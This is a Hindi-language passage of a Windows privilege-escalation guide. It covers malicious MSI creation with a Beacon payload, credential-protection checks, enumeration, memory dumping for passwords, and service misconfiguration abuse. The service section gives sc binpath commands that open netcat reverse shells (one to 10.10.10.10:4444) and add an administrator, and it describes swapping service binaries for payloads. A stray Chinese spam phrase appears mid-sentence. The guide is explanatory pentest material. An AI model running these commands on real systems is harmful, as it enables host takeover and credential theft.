- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- Project को कोई नाम दें, जैसे **AlwaysPrivesc**; location के लिए **`C:\privesc`** इस्तेमाल करें; **place solution and project in the same directory** चुनें और **Create** पर क्लिक करें।
- जब तक आप step 3 of 4 (शामिल करने के लिए files चुनें) तक न पहुंचें, **Next** पर क्लिक करते रहें। **Add** पर क्लिक करें और अभी बनाया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को चुनें और **Properties** में **TargetPlatform** को **x86** से बदलकर **x64** करें।
  - आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिख सकता है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे installer चलते ही Beacon payload execute हो जाएगा।
- **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** में बदलें।
- अंत में, इसे **build** करें।
  - अगर चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` file की **installation** को **background** में execute करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus और Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको इस पर ध्यान देना चाहिए

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि लॉग कहाँ भेजे जाते हैं।

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को **स्थानीय Administrator पासवर्ड के प्रबंधन** के लिए डिज़ाइन किया गया है। यह सुनिश्चित करता है कि डोमेन से जुड़े कंप्यूटरों पर हर पासवर्ड **अद्वितीय, यादृच्छिक और नियमित रूप से अपडेट किया गया** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों। अनुमति होने पर वे स्थानीय admin पासवर्ड देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय हो, तो **सादे टेक्स्ट वाले पासवर्ड LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से शुरू करते हुए, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा शुरू की, ताकि अविश्वसनीय प्रक्रियाओं द्वारा **उसकी memory पढ़ने** या उसमें code inject करने की कोशिशों को **रोका** जा सके और सिस्टम को अधिक सुरक्षित बनाया जा सके।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहाँ उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### कैश्ड क्रेडेंशियल

**डोमेन क्रेडेंशियल** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटक उनका उपयोग करते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत security package द्वारा प्रमाणित किया जाता है, तो आमतौर पर उस उपयोगकर्ता के लिए डोमेन क्रेडेंशियल स्थापित हो जाते हैं।\
[**कैश्ड क्रेडेंशियल के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूहों की Enumeration

आपको जाँचना चाहिए कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास दिलचस्प permissions तो नहीं हैं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privileged groups

अगर आप **किसी privileged group के सदस्य हैं, तो आप privileges escalate कर सकते हैं**। privileged groups और privileges escalate करने के लिए उनका दुरुपयोग कैसे करें, इसके बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** क्या है, इसके बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
interesting tokens के बारे में **जानने** और उनका दुरुपयोग कैसे करें, इसके लिए अगला पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की कमांड लाइन में पासवर्ड खोजें**।\
जाँचें कि क्या आप **चल रही किसी बाइनरी को ओवरराइट कर सकते हैं** या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाने के लिए बाइनरी फ़ोल्डर पर आपके पास लिखने की अनुमति है:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा जांचें कि [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) चल रहे हैं या नहीं; privileges escalate करने के लिए उनका दुरुपयोग किया जा सकता है।

Debugger listener थोड़े समय के लिए चल सकता है, इसलिए एक passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी expose नहीं हुआ था। दिखाई देने वाले किसी भी listener का PID, process owner और उस तक कम privileges वाले user की पहुंच की क्षमता जांचें; केवल application name या debug flag से यह साबित नहीं होता कि cross-user code execution संभव है। Routine enumeration को passive रखें और debugger commands न भेजें।

**Processes के binaries की permissions जांचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रोसेस की बाइनरीज़ वाले फ़ोल्डरों की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, कॉन्फ़िगरेशन में घोषित `dynamicpreprocessor directory` से shared libraries लोड कर सकता है; यह कॉन्फ़िगरेशन `snort.exe -c <config>` से चुना जाता है। किसी scheduled task या service के लिए, जो Snort को किसी दूसरे account के तहत चलाता है, उसी सटीक कॉन्फ़िगरेशन और घोषित module directory के ACL की जाँच करें। यदि आपका token वहाँ files बना सकता है, तो जब वह task या service अगली बार modules लोड करे, तब यह path code execution की समीक्षा के लिए एक candidate है। run-as account के effective privileges, सक्रिय कॉन्फ़िगरेशन, module compatibility और किसी भी deny या share restriction की पुष्टि करें; केवल writable directory से privilege escalation साबित नहीं होती। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) में runtime module loading का वर्णन है।

### writable document root वाली privileged web service

Windows Apache installation में service के executable path और run-as account की तुलना उसके सक्रिय `httpd.conf` में दिए गए `DocumentRoot` से करें। सामान्य XAMPP layout के लिए, `C:\xampp\apache\conf\httpd.conf` और उसके configured document root के ACL की जाँच करें; यह अक्सर `C:\xampp\htdocs` होता है। यदि कम-privileged user उस root में files बना सकता है, जबकि Apache `LocalSystem` के रूप में चलता है, तो server-side code execution से host की privilege boundary पार हो सकती है। पुष्टि करें कि service चल रही है, सटीक path serve किया जा रहा है, और server-side handler उस file type को process करता है; केवल writable root से file creation ही साबित होती है। probe लिखे बिना ACL की जाँच करें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक पारंपरिक WAMP इंस्टॉलेशन में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout के लिए `C:\wamp\...`) की ओर संकेत कर सकती है। उसकी configuration पास में `conf\httpd.conf` में और default root `C:\wamp64\www` या `C:\wamp\www` में हो सकता है। exact service image, उसका run-as identity, प्रभावी `DocumentRoot` (जिसमें `${INSTALL_DIR}` का विस्तार और virtual-host overrides शामिल हैं), और root ACL—इन सबकी एक साथ जाँच करें। केवल WAMP directory का writable होना यह साबित नहीं करता कि Apache `SYSTEM` के रूप में चलता है या जमा की गई file को execute करता है। [Apache बताता है कि Windows service अपनी configuration कैसे चुनती है](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)।

### Writable IIS root और application-pool network identity

IIS में, `applicationHost.config` के जरिए किसी writable physical directory को **active site/application** से map करें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखे गए code को pool के रूप में चलने के लिए IIS का उस file type को process करना और उस route का reachable होना आवश्यक है। Writable directory को code execution मानने से पहले, मौजूदा user की effective create-file access, site की runtime state, handler और प्रति-path overrides जाँचें।

ASP.NET dynamic compilation में जाँचने के लिए एक अलग path भी होता है: application की compilation directory के अंतर्गत generated files। Default रूप से यह संबंधित .NET Framework installation के भीतर `Temporary ASP.NET Files` directory होती है, लेकिन application की `<compilation tempDirectory>` इसे बदल सकती है। [Microsoft इसका location और प्रति-application subdirectories बताता है](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [जब application pools एक-दूसरे पर भरोसा नहीं करते, तब compilation directories को अलग रखने की सलाह देता है](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)। यदि lower-privileged token किसी **विशिष्ट** application के cache में generated source को बदल सकता है, तो पता करें कि क्या वह application उसे अधिक privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के अंतर्गत दोबारा compile करती है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, effective token और ACL, compilation settings, process identity, और किसी भी recompile के समय से मिलाकर जाँचें। केवल read-only metadata की समीक्षा करें; enumeration के दौरान compilation trigger न करें और cache files न बदलें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool आम तौर पर domain resources के सामने **host computer account** के रूप में authenticate करता है, भले ही उसका local token low-privileged हो। `LocalSystem` स्थानीय स्तर पर पहले से ही highly privileged होता है और network पर computer account का उपयोग भी करता है; `LocalService` आम तौर पर anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपना configured account उपयोग करता है। [Microsoft इन identity types का विवरण देता है](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [application-pool network identity का भी](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)। यदि identity setting छोड़ी गई हो, तो वह pool defaults से inherit हो सकती है, जो अलग-अलग IIS generations में भिन्न होते हैं; इसलिए pool name से अनुमान लगाने के बजाय effective configuration का पता लगाएँ। यदि code execution ऐसे pool तक पहुँचता है जिसकी network identity computer account है, तो **उस विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights आवश्यक हैं; केवल machine-account ticket या host role से वे साबित नहीं होते। Passive enumeration में configuration और ACLs की जाँच करें—बिना file upload किए, network authentication किए या tickets माँगे।

यदि कोई readable ASP.NET handler helper process शुरू करता है, तो request-derived value को authentication, decryption, validation और command construction के हर चरण में trace करें। ऐसा handler जो decoded token को `ProcessStartInfo("cmd", "/c ...")` में concatenate करता है, shell metacharacters को command बदलने दे सकता है; [Microsoft `cmd` के special characters का विवरण देता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)। पहले यह स्थापित करें कि कोई untrusted caller वास्तव में decoded value को प्रभावित कर सकता है और handler तक पहुँच सकता है; फिर effective application-pool या impersonated identity और child process की identity का पता लगाएँ। केवल readable source line, localhost listener या token-format weakness से privileged command execution साबित नहीं होता। Passive enumeration के दौरान forged requests भेजे बिना या helper चलाए बिना source और pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request-controlled path जिसे [`include` या `require`](https://www.php.net/manual/en/function.include.php) में दिया जाता है, lower-user-writable PHP file को worker की identity के अंतर्गत evaluate कर सकता है। पुष्टि करें कि request उस statement तक पहुँच सकती है, resolved path ऐसी file को दर्शाता है जिसे lower user बदल सकता है और worker पढ़ सकता है, लागू PHP path restrictions include की अनुमति देते हैं, और worker वास्तव में higher privileges के साथ चलता है। अकेला loopback listener या writable file इस chain को साबित नहीं करता; passive enumeration के दौरान endpoint invoke किए बिना source, service identity और file ACLs की जाँच करें।

### Memory से Password की खोज

Sysinternals के **procdump** का उपयोग करके आप किसी running process का memory dump बना सकते हैं। FTP जैसी services में **credentials memory में clear text में होते हैं**; memory dump करके credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले ऐप्लिकेशन किसी उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, फिर "Click to open Command Prompt" पर क्लिक करें

### Privileged project-file import

जो ऐप्लिकेशन किसी ऐसे drop directory से प्रोजेक्ट अपने-आप खोलते हैं, जिसमें कम-विशेषाधिकार वाला उपयोगकर्ता लिख सकता है, वे importer के खाते के तहत input trust boundary पार करते हैं। **ठीक-ठीक writable path**, उसे खोलने वाली प्रक्रिया या task, उसकी effective identity और parser build की जाँच करें। [Ghidra में ऐतिहासिक project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71) के कारण project metadata में XML external entities की अनुमति थी; यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) अनुमति दें, तो Windows पर network entity से importing account के credentials का authentication हो सकता था। यह credentials उजागर होने की संभावना है, तुरंत administrator access नहीं: response को किसी अलग authorized या vulnerable path के माध्यम से उपयोग किया जा सकना चाहिए, और मौजूदा builds का आकलन उनकी वास्तविक patch स्थिति के आधार पर किया जाना चाहिए। Passive enumeration के दौरान crafted project न खोलें; import workflow और ACLs की जाँच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` right](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service पर मौजूद rights से अलग है। उस right के लिए सफल, read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) जाँच का संकेत है, यह इस बात का प्रमाण नहीं कि नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसमें creation के समय माँगे गए service access rights होते हैं; बाद में service को फिर से खोलने पर अलग access check होता है और वह असफल हो सकता है, भले ही मूल handle का उपयोग किया जा सकता हो। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग पुष्टि करें। Passive enumeration के दौरान service न बनाएँ और न शुरू करें।

Remote service-install path के लिए, उन SCM rights का मिलान target पर ऐसे share से करें, जिसमें **वही network logon** लिख सकता हो; साथ ही उसके underlying NTFS ACL और उस local executable path की जाँच करें जिसे service account चला सकता है। यदि असामान्य रूप से व्यापक SCM rights और file रखने का path, दोनों मौजूद हों, तो non-admin account भी यह boundary पार कर सकता है; administrative share अनिवार्य नहीं है। केवल share write access या SCM create-service का संकेत यह साबित नहीं करता कि नई service उच्च identity के तहत शुरू हो सकती है।

मौजूदा service startup, shutdown या किसी अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में मौजूद न हो। यदि helper का नाम किसी ऐसे directory में resolve होता है, जिसमें कम-विशेषाधिकार वाला उपयोगकर्ता लिख सकता है, और service उच्च identity के तहत चलती है, तो अनुपस्थित helper file को शर्तों के अधीन बदलने के उम्मीदवार के रूप में देखा जा सकता है। **वास्तविक service code या documented helper invocation**, resolved executable path और search order, directory बनाने के अधिकार, service identity और उपलब्ध lifecycle trigger की पुष्टि करें। Writable service directory या अनुपस्थित file अकेले यह साबित नहीं करते कि service उस file को load करती है; passive review में service को शुरू या बंद न करें।

मौजूदा service के लिए, [`SERVICE_START` से `StartService` को arguments दिए जा सकते हैं](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या documented interface की जाँच करें। यदि यह caller द्वारा चुने गए argument को log या export path के रूप में इस्तेमाल करती है, तो service identity, argument से write तक का सटीक flow, path restrictions और **बनाई गई file** की permissions की पुष्टि करें। Protected directory में लिखना तभी escalation बन सकता है जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; केवल writable log या start right पर्याप्त नहीं है। Passive inventory के दौरान service शुरू न करें और test file न बनाएँ।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` **configuration review का संकेत** है: इसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी अन्य स्थान पर redirect कर सकती है। वास्तविक service account, WEB listener और access policy की जाँच करें, साथ ही यह भी कि authenticated role settings या scripts बदल सकती है या नहीं। Privileged execution के लिए अतिरिक्त रूप से `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का effective right, और ऐसा trigger आवश्यक है जो उसे service identity के तहत चलाए। केवल loopback तक सीमित listener भी local user के लिए reachable हो सकती है, लेकिन केवल file path, password या listener से उन rights की पुष्टि नहीं होती। Passive enumeration के दौरान secrets दिखाए बिना या web API invoke किए बिना metadata और permissions की जाँच करें। [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/), और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/) देखें।

ऐसी service के लिए जिसका `ImagePath` `nssm.exe` है, service का वास्तविक run-as account और उसका `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value देखें: [NSSM child application को वहाँ संग्रहीत करता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory है। Wrapper की permissions को पूरी service boundary मानने से पहले child executable और उसकी parent-directory ACLs की जाँच करें। उस child द्वारा expose किया गया local WCF या SOAP endpoint, जाँच का एक अलग संकेत है: पुष्टि करें कि कम-विशेषाधिकार वाला user उस listener तक पहुँच सकता है, संबंधित operation उसका input स्वीकार करती है, और service child असुरक्षित operation को उच्च identity के तहत execute करता है। केवल service account, endpoint URL या writable path से escalation साबित नहीं होती; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller के नियंत्रण वाली string को किसी भी PowerShell runspace तक trace करें। [`Pipeline.Commands.AddScript` script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`Windows transport credentials वाला `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करता है, लेकिन उस **विशिष्ट** operation को call करने की authorization और runspace की effective identity अलग से जाँची जानी चाहिए। किसी कम-विशेषाधिकार वाले caller के input से उच्च service identity के तहत `AddScript` तक जाने वाला path, code-execution boundary है; केवल listening port, authenticated client या किसी असंबंधित assembly में unused method इसका प्रमाण नहीं है। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static समीक्षा करें।

Service Triggers कुछ स्थितियाँ होने पर Windows को service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि)। SERVICE_START rights न होने पर भी, अक्सर उनके triggers fire करके privileged services शुरू की जा सकती हैं। Enumeration और activation की techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाले Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है, जो `LocalSystem` के रूप में चलने के लिए configured diagnostic service है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में service DACL reset को redirect करने के लिए junction और object-manager-link race का उपयोग किया गया था। प्रदर्शित escalation के लिए उपयोग करने योग्य Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी आवश्यक था। यह component जनवरी 2024 में ठीक किया गया था।

Passive triage के लिए, उस एक service का account और binary path देखें, जाँचें कि Setup WMI compiler path मौजूद है या नहीं, और installed component की patch स्थिति सत्यापित करें। केवल service entry, Visual Studio product version या compiler file से यह साबित नहीं होता कि host vulnerable है। जाँच के लिए service शुरू करने या repair चलाने की आवश्यकता नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

प्रत्येक service के लिए आवश्यक privilege level जांचने हेतु _Sysinternals_ का binary **accesschk** उपलब्ध होना recommended है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जाँचने की अनुशंसा की जाती है कि क्या "Authenticated Users" किसी service को modify कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service सक्षम करें

यदि आपको यह error मिल रहा है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 आया है._\
_यह service शुरू नहीं हो सकती, क्योंकि यह disabled है या इससे जुड़े कोई enabled devices नहीं हैं।_

आप इसे इस तरह enable कर सकते हैं 北京赛车女

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान रखें कि (XP SP1 के लिए) upnphost सेवा काम करने के लिए SSDPSRV पर निर्भर करती है।**

**इस समस्या का एक और workaround** चलाना है:

```
sc.exe config usosvc start= auto
```

### **Service binary path में बदलाव**

ऐसी स्थिति में, जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, service की executable binary में बदलाव करना संभव है। **sc** में बदलाव करने और उसे execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा को पुनरारंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

विभिन्न permissions के माध्यम से privileges बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permissions को reconfigure करने में सक्षम बनाता है, जिससे service configurations बदलना संभव होता है।
- **WRITE_OWNER**: ownership हासिल करने और permissions reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता विरासत में देता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी विरासत में देता है।

इस vulnerability का पता लगाने और exploit करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमज़ोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को बदलकर और service को restart करके** उस service को hijack किया जा सकता है।

**जाँचें कि क्या आप किसी service द्वारा execute की जाने वाली binary को modify कर सकते हैं**, या क्या आपको उस **folder पर write permissions** हैं जिसमें binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
आप **wmic** (system32 में नहीं) का उपयोग करके service द्वारा execute की जाने वाली हर binary प्राप्त कर सकते हैं और **icacls** से अपनी permissions जाँच सकते हैं:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, खासकर service executable पर या उसे रखने वाली directory पर **`(F)`**, **`(M)`**, या **`(W)`**। दुरुपयोग का एक व्यावहारिक तरीका यह है:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary writable है।
3. Service binary को payload या किसी valid malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service restart करें (या reboot / service trigger का इंतज़ार करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि service सामान्य user को उसे restart करने की अनुमति नहीं देता, तो जाँचें कि क्या वह boot पर अपने-आप start होता है, उसमें कोई failure action है जो उसे फिर से launch करता है, या उसका उपयोग करने वाले application से उसे अप्रत्यक्ष रूप से trigger किया जा सकता है।

### Services registry modify permissions

आपको जाँचना चाहिए कि क्या आप किसी service registry को modify कर सकते हैं।\
आप किसी service **registry** पर अपनी **permissions** इस तरह **check** कर सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

मूल permission test इस प्रकार बताया गया था:

यह जाँचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि ऐसा है, तो service द्वारा execute किए जाने वाले binary को बदला जा सकता है।

